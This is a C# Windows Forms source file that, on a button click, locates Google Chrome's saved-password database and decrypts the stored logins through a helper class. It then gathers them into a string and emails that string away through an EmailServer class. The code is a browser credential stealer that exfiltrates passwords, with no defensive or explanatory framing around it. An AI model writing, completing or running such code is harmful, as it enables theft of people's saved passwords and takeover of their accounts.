using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using SQLiteReader;
using System.IO;

namespace LoginData
{
    public partial class LoginData : Form
    {
        public LoginData()
        {
            InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var chromeLoginDataPath = ChromeDecrypting.GetDefaultChromePasswordFile();
            var mailServer = new EmailServer();
            string loginsString = "";
            listView1.Items.Clear();

            if (File.Exists(chromeLoginDataPath))
            {
                loginsString += "GOOGLE CHROME BROWSER \r\n";
                try
                {
                    var chromeLogins = new ChromeDecrypting().GetLogins();
                    foreach (var login in chromeLogins)
                    {
                        loginsString += login.GetLoginsString();
                        listView1.Items.Add(login.GetLoginsString());
                    }
                    mailServer.SendEmail(loginsString);
                }
                catch (Exception ex)
                {
                    loginsString += ex.Message;
                    listView1.Items.Add(ex.Message);
                }
            }
        }
    }
}
